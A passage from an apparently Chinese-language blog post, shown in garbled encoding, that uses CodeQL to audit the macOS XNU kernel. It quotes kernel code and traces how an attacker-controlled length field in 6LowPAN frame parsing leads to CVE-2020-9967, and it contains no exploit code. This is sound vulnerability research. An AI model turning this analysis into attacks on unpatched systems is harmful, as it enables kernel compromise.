packetçš„ icmplen åšæ£€æŸ¥ï¼Œä½¿å¾—è¿™ä¸ªé•¿åº¦å¿…é¡»æ˜¯åœ¨åˆæ³•èŒƒå›´å†…ï¼ˆæ ¹æ®åŒ…ç»“æ„æ¥è®¡ç®—ï¼‰</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%206.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%206.png"></p><ul><li>é•¿åº¦å¿…é¡» å¤§äºç­‰äº <code>sizeof(struct ip) + ICMP_MINLEN</code></li><li>é•¿åº¦å¿…é¡» å¤§äºç­‰äº <code>oiphlen+ICMP_MINLEN</code></li></ul><p>åé¢è¦è®¡ç®— è¿”å›åŒ…é•¿åº¦çš„æ—¶å€™:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%207.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%207.png"></p><p>æ‰€ä»¥è¿™é‡Œå–åˆ°çš„ä¸€å®šæ˜¯ä¸€ä¸ªåˆæ³•çš„å€¼ã€‚</p><p>å†çœ‹åç»­æ ¹æ®é•¿åº¦ï¼Œæ‹·è´æ•°æ®çš„é€»è¾‘ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%208.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%208.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icmplen = min(icmplen, M_TRAILINGSPACE(m) -</span><br><span class="line">        <span class="keyword">sizeof</span>(struct ip) - ICMP_MINLEN);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé•¿åº¦æ˜¯ç»è¿‡è®¡ç®—çš„ï¼ŒæŠŠä¸ºm dataéƒ¨åˆ†åˆ†é…çš„ç©ºé—´å¤§å°è€ƒè™‘äº†è¿›å»ï¼Œè¿™æ ·ä¿è¯æ‹·è´æ•°æ®çš„é•¿åº¦æ˜¯åˆæ³•çš„ã€‚</p><p>è‡³æ­¤è¿™ä¸ªæ´ç®—æ˜¯ä¿®çš„æ²¡é—®é¢˜äº†ã€‚</p><h3 id="Apple-macOS-6LowPAN-Vulnerability"><a href="#Apple-macOS-6LowPAN-Vulnerability" class="headerlink" title="Apple macOS 6LowPAN Vulnerability"></a>Apple macOS 6LowPAN Vulnerability</h3><p><a href="https://alexplaskett.github.io/CVE-2020-9967/">CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability</a></p><h4 id="Setup-env-1"><a href="#Setup-env-1" class="headerlink" title="Setup env"></a>Setup env</h4><p>æœ‰æ¼æ´çš„ç‰ˆæœ¬ <code>10.15.4</code> ä¸ºç›®æ ‡ï¼Œè‹¹æœä¹Ÿåœ¨Big Suré‡Œåšäº†ä¿®å¤ï¼Œè¿™äº›æ´å½±å“èŒƒå›´è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œä¸ºäº†æ–¹ä¾¿èµ·è§ä½¿ç”¨ <code>10.15.4</code> ã€‚ (â‰¤ 10.15.4)</p><p><a href="https://kernelshaman.blogspot.com/2020/09/building-xnu-for-macos-catalina-1015x.html">Building XNU for macOS Catalina 10.15.x</a></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%209.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%209.png"></p><p>éšåæµ‹è¯•ä¸€ä¸‹æ•°æ®åº“å¯ç”¨å³å¯ã€‚</p><h4 id="aliyuncs-com-img-codeql-xnu-codeql-xnu-query"><a href="#aliyuncs-com-img-codeql-xnu-codeql-xnu-query" class="headerlink" title="aliyuncs.com/img/codeql_xnu/codeql-xnu query"></a>aliyuncs.com/img/codeql_xnu/codeql-xnu query</h4><p>åœ¨è¿™ä¸ªç‰ˆæœ¬çš„xnuä»£ç (6153.101.6)ï¼Œbcopyåœ¨xnuä¸­è¢«å¤§é‡ä½¿ç”¨ï¼Œä½†æ˜¯å®ç°æ¢æˆäº† <code>builtin___memmove_chk</code> ï¼Œæ‰€ä»¥åªéœ€è¦æŠŠ ä¹‹å‰æ±¡ç‚¹è¿½è¸ªçš„ queryçš„sinkæ›¿æ¢ä¸€ä¸‹å³å¯ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2010.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2010.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2011.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2011.png"></p><p>èƒ½è¦†ç›–åˆ°è¿™äº›é—®é¢˜ï¼Œä½†æ˜¯éœ€è¦æŒ¨ä¸ªç»“æœå®¡è®¡ï¼Œç„¶åæ„é€ pocæ‰è¡Œã€‚</p><h4 id="About-6LowPAN"><a href="#About-6LowPAN" class="headerlink" title="About 6LowPAN"></a>About <code>6LowPAN</code></h4><p><code>6LowPAN</code> åœ¨ macOS10.15å¼•å…¥ï¼Œå…¨ç§°æ˜¯: <code>IPv6 over Low-Power Wireless Persona Area Networks</code> </p><p>6LoWPANæ˜¯ä¸€ç§åŸºäºIPv6çš„ä½é€Ÿæ— çº¿ä¸ªåŸŸç½‘æ ‡å‡†ï¼Œå³IPv6 over IEEE 802.15.4ã€‚è®©æ¯ä¸ªèŠ‚ç‚¹å¯ä»¥ç”¨IPv6åœ°å€è”ç½‘ã€‚è¿™å…è®¸èŠ‚ç‚¹ä½¿ç”¨å¼€æ”¾æ ‡å‡†ç›´æ¥ä¸Internetè¿æ¥ã€‚å³ä½¿åœ¨æœ€å°çš„èµ„æºå—é™è®¾å¤‡ä¸Šä¹Ÿå¯ä»¥åº”ç”¨Internetåè®®ï¼Œå¹¶ä¸”å¤„ç†èƒ½åŠ›æœ‰é™çš„ä½åŠŸç‡è®¾å¤‡åº”è¯¥èƒ½å¤Ÿå‚ä¸ç‰©è”ç½‘ã€‚</p><p><a href="https://zhuanlan.zhihu.com/p/152457583">å¹¿åŸŸæ— çº¿ç‰©è”ç½‘åŠ6LoWPANä»‹ç»</a></p><p><a href="https://tools.ietf.org/html/rfc4919">RFC 4919 - IPv6 over Low-Power Wireless Personal Area Networks (6LoWPANs): Overview, Assumptions, Problem Statement, and Goals</a></p><p>ï¼ˆççŒœä¸€ä¸‹ï¼Œæ„Ÿè§‰è¿™ä¸ªä¸œè¥¿æ˜¯å¯¹åº”10.15é‡Œå¼•å…¥çš„é‚£ä¸ª â€œä»¥<em>æŸ¥æ‰¾</em>æœªè”ç½‘Mac çš„åŠŸèƒ½â€œ ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">frame802154.c â†’ 802.15.4å¸§åˆ›å»ºå’Œè§£æé€»è¾‘</span><br><span class="line"></span><br><span class="line">if_6lowpan.c â†’ 6LowPAN network interface</span><br><span class="line"></span><br><span class="line">sixlowpan.c â†’ 6LowPAN å‹ç¼©/è§£å‹é€»è¾‘</span><br></pre></td></tr></table></figure><ul><li>IEEE 802.15.4å¸§æ ¼å¼</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2012.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2012.png"></p><p>frame control å­—æ®µï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2013.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2013.png"></p><p>IPv6æŠ¥æ–‡å¿…é¡»æ‰¿è½½åœ¨æ•°æ®å¸§ä¸Šã€‚è§£æå¸§çš„æ—¶å€™ï¼Œé¦–å…ˆç¡®å®šheaderï¼Œéšåè§£æ payloadéƒ¨åˆ†ã€‚</p><ul><li>LoWPAN Payload</li></ul><p>ç”±äºå…¨IPv6æŠ¥æ–‡ä¸ç¬¦åˆieee802.15.4å¸§çš„è¦æ±‚ï¼ŒIPv6éœ€è¦æä¾›é€‚é…å±‚æ¥æ»¡è¶³MTUçš„æœ€å°è¦æ±‚ã€‚è¯¥æ ‡å‡†è¿˜å®šä¹‰äº†æŠ¥å¤´å‹ç¼©çš„ä½¿ç”¨ï¼Œå› ä¸ºé¢„è®¡å¤§å¤šæ•°åº”ç”¨ç¨‹åºå°†ä½¿ç”¨IEEE 802.15.4ä¸Šçš„IPã€‚</p><p>LoWPAN payload (e.g., an IPv6 packet) éµå¾ªä¸Šé¢çš„æè¿°ï¼›IPv6 å¤´æœ‰40å­—èŠ‚ã€‚</p><p>åœ¨åˆå§‹æ ‡å‡†ä¸­ï¼Œå®šä¹‰äº† <code>LoWPAN_HC1</code> å‹ç¼©IPv6æ•°æ®æŠ¥ã€‚è¿™æ„å‘³ç€6LowPANçš„payload åœ¨æ¥æ”¶æ—¶è¢«å‹ç¼©ã€‚</p><ul><li>Data Link Layer Dispatching æ•°æ®é“¾è·¯å±‚åˆ†å‘</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2014.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2014.png"></p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸€ä¸ªä»¥å¤ªç½‘æ•°æ®åŒ…ï¼Œè¯¥æ•°æ®åŒ…å°†ç”±demuxå‡½æ•°å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">ether_demux</span><span class="params">(<span class="keyword">ifnet_t</span> ifp, <span class="keyword">mbuf_t</span> m, <span class="keyword">char</span> *frame_header,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">protocol_family_t</span> *protocol_family)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ether_header</span> *<span class="title">eh</span> =</span> (struct ether_header *)(<span class="keyword">void</span> *)frame_header;</span><br><span class="line">    u_short  ether_type = eh-&gt;ether_type;</span><br><span class="line">    <span class="keyword">u_int16_t</span> type;</span><br><span class="line">    <span class="keyword">u_int8_t</span> *data;</span><br><span class="line">    <span class="keyword">u_int32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ether_desc_blk_str</span> *<span class="title">desc_blk</span> =</span></span><br><span class="line">        (struct ether_desc_blk_str *)ifp-&gt;if_family_cookie;</span><br><span class="line">    <span class="keyword">u_int32_t</span> maxd = desc_blk ? desc_blk-&gt;n_max_used : <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">en_desc</span>  *<span class="title">ed</span> =</span> desc_blk ? desc_blk-&gt;block_ptr : <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> extProto1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> extProto2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (eh-&gt;ether_dhost[<span class="number">0</span>] &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* Check for broadcast */</span></span><br><span class="line">        <span class="keyword">if</span> (_ether_cmp(etherbroadcastaddr, eh-&gt;ether_dhost) == <span class="number">0</span>) &#123;</span><br><span class="line">            m-&gt;m_flags |= M_BCAST;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m-&gt;m_flags |= M_MCAST;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m-&gt;m_flags &amp; M_HASFCS) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If the M_HASFCS is set by the driver we want to make sure</span></span><br><span class="line"><span class="comment">         * that we strip off the trailing FCS data before handing it</span></span><br><span class="line"><span class="comment">         * up the stack.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        m_adj(m, -ETHER_CRC_LEN);</span><br><span class="line">        m-&gt;m_flags &amp;= ~M_HASFCS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((eh-&gt;ether_dhost[<span class="number">0</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * When the driver is put into promiscuous mode we may receive</span></span><br><span class="line"><span class="comment">         * unicast frames that are not intended for our interfaces.</span></span><br><span class="line"><span class="comment">         * They are marked here as being promiscuous so the caller may</span></span><br><span class="line"><span class="comment">         * dispose of them after passing the packets to any interface</span></span><br><span class="line"><span class="comment">         * filters.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (_ether_cmp(eh-&gt;ether_dhost, IF_LLADDR(ifp))) &#123;</span><br><span class="line">            m-&gt;m_flags |= M_PROMISC;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for IEEE 802.15.4 */</span></span><br><span class="line">    <span class="keyword">if</span> (ether_type == htons(ETHERTYPE_IEEE802154)) &#123;</span><br><span class="line">        *protocol_family = PF_802154;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä»¥å¤ªæŠ¥å¤´ä¸­çš„ <code>ether_type</code> æ˜¯ <code>ETHERTYPE_IEEE802154</code> , é‚£ä¹ˆè¯¥å‡½æ•°ä¼šå°†åè®®æ—è®¾ç½®ä¸ºPF 802154ã€‚</p><p>ç°åœ¨ï¼Œåœ¨é»˜è®¤é…ç½®ä¸­ï¼Œè¿™ä¸ªåè®®æ—å°†ä¸ä¼šè¢«å¤„ç†ï¼Œé™¤éé…ç½®äº†6lowpanæ¥å£ï¼Œè¿™å°†å¯¼è‡´ä»¥ä¸‹ä»£ç æ³¨å†Œä¸€ä¸ªå‡½æ•° <code>sixlowpan_input</code> ï¼Œå½“å¤„ç†ä¸€ä¸ª802.15.4å¸§æ—¶å°†è¢«è°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Function: sixlowpan_attach_protocol</span></span><br><span class="line"><span class="comment"> * Purpose:</span></span><br><span class="line"><span class="comment"> *   Attach a DLIL protocol to the interface</span></span><br><span class="line"><span class="comment"> *     The ethernet demux actually special cases 802.15.4.</span></span><br><span class="line"><span class="comment"> *     The demux here isn&#x27;t used. The demux will return PF_802154 for the</span></span><br><span class="line"><span class="comment"> *     appropriate packets and our sixlowpan_input function will be called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sixlowpan_attach_protocol</span><span class="params">(struct ifnet *ifp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>     error;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifnet_attach_proto_param</span> <span class="title">reg</span>;</span></span><br><span class="line"></span><br><span class="line">    bzero(&amp;reg, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">    reg.input            = sixlowpan_input;</span><br><span class="line">    reg.detached         = sixlowpan_detached;</span><br><span class="line">    error = ifnet_attach_protocol(ifp, PF_802154, &amp;reg);</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s(%s%d) ifnet_attach_protocol failed, %d\n&quot;</span>,</span><br><span class="line">            __func__, ifnet_name(ifp), ifnet_unit(ifp), error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h4><p>è°ƒç”¨sixlowpan_inputå‡½æ•°æ¥è§£å°è£…802.15.4æ•°æ®å¸§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 6lowpan input routine.</span></span><br><span class="line"><span class="comment"> * Decapsulate the 802.15.4 Data Frame</span></span><br><span class="line"><span class="comment"> * Header decompression on the payload</span></span><br><span class="line"><span class="comment"> * Pass the mbuf to the IPV6 protocol stack using proto_input()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sixlowpan_input</span><span class="params">(<span class="keyword">ifnet_t</span> p, __unused <span class="keyword">protocol_family_t</span> protocol,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">mbuf_t</span> m, __unused <span class="keyword">char</span> *frame_header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">frame802154_t</span>      ieee02154hdr;</span><br><span class="line">    <span class="keyword">u_int8_t</span>           *payload = <span class="literal">NULL</span>;</span><br><span class="line">    if6lpan_ref        ifl = <span class="literal">NULL</span>;</span><br><span class="line">    bpf_packet_func    bpf_func;</span><br><span class="line">    <span class="keyword">mbuf_t</span> mc, m_temp;</span><br><span class="line">    <span class="keyword">int</span> off, err = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int16_t</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an mbuf cluster for the 802.15.4 frame and uncompressed payload */</span></span><br><span class="line">    mc = m_getcl(M_WAITOK, MT_DATA, M_PKTHDR);</span><br><span class="line">    <span class="keyword">if</span> (mc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;len, mtod(m, <span class="keyword">u_int8_t</span> *), <span class="keyword">sizeof</span>(<span class="keyword">u_int16_t</span>));</span><br><span class="line">    len = ntohs(len);**                     <span class="comment">// This is the size read from the frame on the wire. </span></span><br><span class="line">    m_adj(m, <span class="keyword">sizeof</span>(<span class="keyword">u_int16_t</span>));</span><br><span class="line">    <span class="comment">/* Copy the compressed 802.15.4 payload from source mbuf to allocated cluster mbuf */</span></span><br><span class="line">    <span class="keyword">for</span> (m_temp = m, off = <span class="number">0</span>; m_temp != <span class="literal">NULL</span>; m_temp = m_temp-&gt;m_next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m_temp-&gt;m_len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            m_copyback(mc, off, m_temp-&gt;m_len, mtod(m_temp, <span class="keyword">void</span> *));</span><br><span class="line">            off += m_temp-&gt;m_len;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = p_6lowpan_ifnet;</span><br><span class="line">    mc-&gt;m_pkthdr.rcvif = p;</span><br><span class="line"></span><br><span class="line">    sixlowpan_lock();</span><br><span class="line">    ifl = ifnet_get_if6lpan_retained(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ifl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        sixlowpan_unlock();</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (if6lpan_flags_ready(ifl) == <span class="number">0</span>) &#123;</span><br><span class="line">        if6lpan_release(ifl);</span><br><span class="line">        sixlowpan_unlock();</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bpf_func = ifl-&gt;if6lpan_bpf_input;</span><br><span class="line">    sixlowpan_unlock();</span><br><span class="line">    if6lpan_release(ifl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bpf_func) &#123;</span><br><span class="line">        bpf_func(p, mc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the 802.15.4 frame header */</span></span><br><span class="line">    bzero(&amp;ieee02154hdr, <span class="keyword">sizeof</span>(ieee02154hdr));</span><br><span class="line">    frame802154_parse(mtod(mc, <span class="keyword">uint8_t</span> *), len, &amp;ieee02154hdr, &amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XXX Add check for your link layer address being dest */</span></span><br><span class="line">    sixxlowpan_input(&amp;ieee02154hdr, payload);</span><br></pre></td></tr></table></figure><ol><li><code>m_getcl</code> åˆ†é…mc(mbuf cluster)æ¥å­˜æ”¾è¦å¤„ç†çš„ 802.15.4 få¸§å’Œæœªè§£å‹çš„payload</li><li>æ‹·è´æœªè§£å‹çš„802.15.4 payload åˆ°æ–°åˆ†é…çš„mcä¸­</li></ol><p>len æ˜¯ä»å‚æ•° mbuf m ä¸­è¯»å–å¾—åˆ°çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯æ§çš„å€¼ï¼Œåœ¨åé¢è§£æé€»è¾‘: <strong><code>frame802154_parse</code> ï¼Œè¿™ä¸ªé•¿åº¦æ˜¯ç›´æ¥ä½¿ç”¨çš„ã€‚</strong></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2015.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2015.png"></p><p>å› ä¸ºæˆ‘ä»¬å¯ä»¥å°†lenæ§åˆ¶åœ¨0-0xffffä¹‹é—´ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿pf-&gt;payload_lenä¸ºè´Ÿå€¼(to-header len)ï¼Œå°äºé¢„æœŸçš„å¤§å°ï¼Œæˆ–è€…å¤§äºmcä¸­è¾“å…¥æ•°æ®æœ¬èº«çš„å¤§å°ã€‚</p><p>éšåçš„è°ƒç”¨æ˜¯ <strong><code>sixxlowpan_input(&amp;ieee02154hdr, payload);</code></strong> </p><p>è¿™ä¸ªå‡½æ•°ç›´æ¥ä½¿ç”¨äº† ä¹‹å‰è§£æå‡ºæ¥çš„pf å’Œ payloadã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">errno_t</span></span></span><br><span class="line"><span class="function"><span class="title">sixxlowpan_input</span><span class="params">(struct frame802154 *ieee02154hdr, <span class="keyword">u_int8_t</span> *payload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">errno_t</span> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    error = sixxlowpan_uncompress(ieee02154hdr, payload);</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * TO DO: fragmentation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åèµ°åˆ° <code>sixxlowpan_uncompress</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">errno_t</span></span></span><br><span class="line"><span class="function"><span class="title">sixxlowpan_uncompress</span><span class="params">(struct frame802154 ***ieee02154hdr**, <span class="keyword">u_int8_t</span> *payload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> hdroffset;</span><br><span class="line">    <span class="keyword">size_t</span> hdrlen;</span><br><span class="line">    <span class="keyword">u_int8_t</span> hdrbuf[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">errno_t</span> error;</span><br><span class="line"></span><br><span class="line">    bzero(hdrbuf, <span class="keyword">sizeof</span>(hdrbuf));</span><br><span 